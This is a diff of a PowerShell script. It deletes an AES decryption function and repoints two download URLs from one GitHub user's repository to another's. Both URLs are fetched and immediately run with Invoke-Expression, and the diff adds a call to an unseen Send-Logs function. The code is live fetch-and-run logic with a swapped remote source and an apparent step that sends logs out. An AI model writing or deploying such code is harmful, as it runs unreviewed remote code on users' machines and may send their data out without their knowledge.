@@ -1,34 +1,7 @@
-function Decrypt-ValidationLogic {
-    param (
-        [string]$encryptedValidation,
-        [string]$key
-    )
-
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.KeySize = 256
-    $aes.BlockSize = 128
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-
-    $keyBytes = [Convert]::FromBase64String($key)
-    $aes.Key = $keyBytes
-
-    $fullBytes = [Convert]::FromBase64String($encryptedValidation)
-    $aes.IV = $fullBytes[0..15]
-    $cipherText = $fullBytes[16..$fullBytes.Length]
-
-    $decryptor = $aes.CreateDecryptor()
-    $decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
-
-    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
-}
-
-
-
 
 Clear-Host
 
-$asciiArtUrl = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Art.ps1"
+$asciiArtUrl = "https://raw.githubusercontent.com/Reapiin/art/main/art.ps1"
 $asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
 Invoke-Expression $asciiArtScript
 
@@ -353,6 +326,16 @@ function Main {
 
     $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
     $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
-    $url = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Credits"
+    $url = "https://raw.githubusercontent.com/Reapiin/art/main/credits"
     $content = Invoke-RestMethod -Uri $url
     Invoke-Expression $content
+    Send-Logs
+
+
+
+
+
+}
+Main
+
+☺
